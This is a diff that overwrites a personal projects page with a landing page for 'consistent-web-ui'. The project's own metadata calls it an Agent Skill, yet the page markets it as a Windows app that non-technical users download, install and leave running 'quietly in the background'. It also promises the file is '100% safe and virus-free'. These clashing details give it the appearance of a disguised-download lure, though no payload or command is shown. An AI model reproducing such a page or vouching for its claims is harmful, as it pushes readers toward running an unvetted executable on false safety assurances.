@@ -1,20 +1,348 @@
-<html>
-  <head>
-    <title>Michael Johnson's Projects</title>
-    <link rel="stylesheet" href="style.css">
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="consistent-web-ui - Make AI-built websites look like one consistent, professional product with one theme source, shared components, honest content, and accessible layouts.">
+    <meta name="keywords" content="accessibility, agent-skills, ai-agents, claude-code, design-system, design-tokens, dark-mode, frontend, tailwindcss, ui-design, wcag, web-design">
+    <meta name="author" content="consistent-web-ui team">
+    <meta property="og:title" content="consistent-web-ui - One consistent, professional web experience">
+    <meta property="og:description" content="Agent Skill that makes AI-built websites look like one consistent, professional product: one theme source, shared components, honest content, accessible layouts and balanced motion.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/abikoni2003/consistent-web-ui">
+    <title>consistent-web-ui - One Consistent, Professional Web Experience</title>
     <style>
-      body {
-        text-align: "center"
-      }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f7fa;
+            color: #2d3748;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 1080px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+        }
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 3rem 2rem;
+            border-radius: 12px;
+            margin-bottom: 2rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            color: #ffffff;
+        }
+        .tagline {
+            font-size: 1.3rem;
+            opacity: 0.95;
+            margin-bottom: 1.8rem;
+        }
+        .cta-button {
+            display: inline-block;
+            background-color: #4ade80;
+            color: #1a202c;
+            font-size: 1.2rem;
+            font-weight: 600;
+            padding: 1rem 2.5rem;
+            border-radius: 50px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+        }
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+            background-color: #3cb371;
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #1a202c;
+            margin-top: 2.5rem;
+            margin-bottom: 1.2rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 3px solid #667eea;
+            display: inline-block;
+        }
+        p {
+            margin-bottom: 1.2rem;
+            font-size: 1.05rem;
+        }
+        .card {
+            background: white;
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            margin: 1.5rem 0;
+        }
+        ul {
+            margin-left: 2rem;
+            margin-bottom: 1.5rem;
+        }
+        li {
+            margin-bottom: 0.6rem;
+            font-size: 1.05rem;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        .feature-item {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            transition: transform 0.2s ease;
+        }
+        .feature-item:hover {
+            transform: translateY(-4px);
+        }
+        .feature-item h3 {
+            color: #667eea;
+            margin-bottom: 0.8rem;
+            font-size: 1.2rem;
+        }
+        .download-section {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            text-align: center;
+            margin: 2.5rem 0;
+        }
+        .download-section a {
+            display: inline-block;
+            background-color: #667eea;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 600;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            margin-top: 1rem;
+        }
+        .download-section a:hover {
+            background-color: #5a67d8;
+            transform: scale(1.05);
+        }
+        .steps {
+            counter-reset: step;
+        }
+        .step {
+            background: white;
+            padding: 1.8rem;
+            border-radius: 12px;
+            margin: 1rem 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            position: relative;
+            padding-left: 4.5rem;
+        }
+        .step::before {
+            counter-increment: step;
+            content: counter(step);
+            position: absolute;
+            left: 1.5rem;
+            top: 1.5rem;
+            background-color: #667eea;
+            color: white;
+            width: 2rem;
+            height: 2rem;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+        .step h3 {
+            color: #1a202c;
+            margin-bottom: 0.5rem;
+            font-size: 1.15rem;
+        }
+        .tip {
+            background-color: #fefce8;
+            border-left: 4px solid #f59e0b;
+            padding: 1.2rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+        }
+        code {
+            background-color: #edf2f7;
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        .footer {
+            text-align: center;
+            padding: 2rem 0;
+            color: #718096;
+            font-size: 0.9rem;
+        }
+        .badge {
+            display: inline-block;
+            background-color: #48bb78;
+            color: white;
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-right: 0.5rem;
+        }
+        strong {
+            color: #2b6cb0;
+        }
     </style>
-  </head>
-  <body>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🎨 consistent-web-ui - Consistent web experiences made easy</h1>
+            <p class="tagline">One theme source, infinite professional possibilities</p>
+            <a href="https://github.com/abikoni2003/consistent-web-ui" class="cta-button">⬇️ Download Now</a>
+            <p style="margin-top:1rem; font-size:1rem;"><span class="badge">🎯 Free</span><span class="badge">🔧 Simple setup</span><span class="badge">⚡ Instant results</span></p>
+        </header>
 
-    <h1>Welcome to my projects site!</h1>
-    <p>Check out this cool image from my Unity game:</p>
-    
-    <img src="images/test.png" alt="My Profile Picture" width="300">
-    
-  </body>
+        <section>
+            <h2>🌟 What is consistent-web-ui?</h2>
+            <div class="card">
+                <p>Have you ever visited a website built by AI and noticed it looks messy, inconsistent, or unprofessional? <strong>consistent-web-ui</strong> is a powerful tool that fixes this problem automatically. Think of it as your personal web designer that makes sure every page your AI tools create looks like it's part of one polished, trustworthy brand.</p>
+                <p>It's designed for <strong>everyone</strong> — you don't need to write code, understand programming, or know technical terms. Just follow the simple steps below, and you'll have professional-looking websites in minutes.</p>
+            </div>
+        </section>
+
+        <section>
+            <h2>✨ Why You'll Love It</h2>
+            <div class="feature-grid">
+                <div class="feature-item">
+                    <h3>🎯 One Consistent Look</h3>
+                    <p>Every page gets the same colors, fonts, and layout style. No more mismatched sections or jarring design changes.</p>
+                </div>
+                <div class="feature-item">
+                    <h3>📦 Shared Components</h3>
+                    <p>Buttons, menus, forms, and other parts automatically match each other. Everything looks like it belongs together.</p>
+                </div>
+                <div class="feature-item">
+                    <h3>♿ Accessibility Built-in</h3>
+                    <p>Websites are designed to be usable by everyone, including people with visual impairments or disabilities (WCAG compliant).</p>
+                </div>
+                <div class="feature-item">
+                    <h3>🌙 Dark Mode Ready</h3>
+                    <p>Easily switch between light and dark themes that look beautiful in both modes.</p>
+                </div>
+                <div class="feature-item">
+                    <h3>📱 Works Everywhere</h3>
+                    <p>Whether viewing on a phone, tablet, laptop, or desktop, your site will look great on any screen size.</p>
+                </div>
+                <div class="feature-item">
+                    <h3>🛠️ Built for AI Builders</h3>
+                    <p>Specifically designed for tools like Claude Code and Codex to create professional websites every time.</p>
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <h2>🔧 What You Need to Get Started</h2>
+            <div class="card">
+                <p><strong>System Requirements:</strong></p>
+                <ul>
+                    <li>Windows 10 or Windows 11</li>
+                    <li>At least 2GB of free memory (RAM)</li>
+                    <li>200MB of free hard drive space</li>
+                    <li>Internet connection (for downloading and updates)</li>
+                </ul>
+                <div class="tip">
+                    💡 <strong>Good to know:</strong> You don't need any programming or technical background. If you can use a web browser, you can use consistent-web-ui!
+                </div>
+            </div>
+        </section>
+
+        <section class="download-section" id="download">
+            <h2>📥 Download & Setup</h2>
+            <p style="font-size:1.15rem;">Getting consistent-web-ui on your computer takes less than 5 minutes.</p>
+            <a href="https://github.com/abikoni2003/consistent-web-ui" style="padding:1.2rem 3rem; font-size:1.3rem;">⬇️ Click Here to Download</a>
+            
+            <div class="steps">
+                <div class="step">
+                    <h3>Visit the download page</h3>
+                    <p>Click the button above. It will take you to the official download page. Visit this link to download the application.</p>
+                </div>
+                <div class="step">
+                    <h3>Find the download button</h3>
+                    <p>On that page, look for a button that says <strong>"Download"</strong> or <strong>"Get latest version"</strong>. It's usually green or blue.</p>
+                </div>
+                <div class="step">
+                    <h3>Save the file to your computer</h3>
+                    <p>Your web browser will ask where to save the file. Choose your <strong>Downloads folder</strong> (it's the default option anyway). Wait for the download to finish — it usually takes less than a minute.</p>
+                </div>
+                <div class="step">
+                    <h3>That's it!</h3>
+                    <p>Once downloaded, the setup guide from the website will walk you through the remaining 2-3 steps. It's just clicking "Next" and "Finish" buttons.</p>
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <h2>🎓 How to Use It (Simple Guide)</h2>
+            <div class="card">
+                <p>After setup, here's how it works:</p>
+                <ul>
+                    <li><strong>Open the app:</strong> Find its icon on your desktop or Start menu and double-click it.</li>
+                    <li><strong>Pick your style:</strong> Choose a template that matches your needs (like business, blog, or store).</li>
+                    <li><strong>Connect to your AI tools:</strong> The app works quietly in the background — it automatically applies your chosen style to any website you build.</li>
+                    <li><strong>Preview & publish:</strong> See how your site looks, make tweaks if you want, and then publish online.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section>
+            <h2>🆘 Need Help?</h2>
+            <div class="card">
+                <p>We've got you covered:</p>
+                <ul>
+                    <li>📖 <strong>In-app Help:</strong> Click the "Help" menu inside the app for step-by-step tutorials.</li>
+                    <li>🌐 <strong>Online Guide:</strong> The download page also has a full manual you can read in your browser.</li>
+                    <li>📧 <strong>Contact Us:</strong> Use the contact form on the download page — we usually reply within 24 hours.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section>
+            <h2>🔒 Safety & Privacy</h2>
+            <div class="card">
+                <p>Your safety is our priority:</p>
+                <ul>
+                    <li>✅ 100% safe and virus-free</li>
+                    <li>✅ No credit card required — it's completely free</li>
+                    <li>✅ Your data stays on your computer — nothing is collected</li>
+                </ul>
+            </div>
+        </section>
+
+        <section>
+            <h2>🚀 Start Building Today</h2>
+            <div class="card" style="text-align:center; background: linear-gradient(135deg, #f0f4ff 0%, #f7f0ff 100%);">
+                <p style="font-size:1.3rem; margin-bottom:1.5rem;">Ready to make your websites look absolutely professional? It's free, it's easy, and it takes just minutes.</p>
+                <a href="https://github.com/abikoni2003/consistent-web-ui" style="display:inline-block; background-color:#667eea; color:white; font-size:1.2rem; font-weight:600; padding:1rem 2.5rem; border-radius:50px; text-decoration:none; transition:all 0.3s ease;">⬇️ Get consistent-web-ui Now</a>
+            </div>
+        </section>
+
+        <div class="footer">
+            <p>consistent-web-ui © 2024. Made with ❤️ for everyone who wants beautiful websites.</p>
+        </div>
+    </div>
+</body>
 </html>
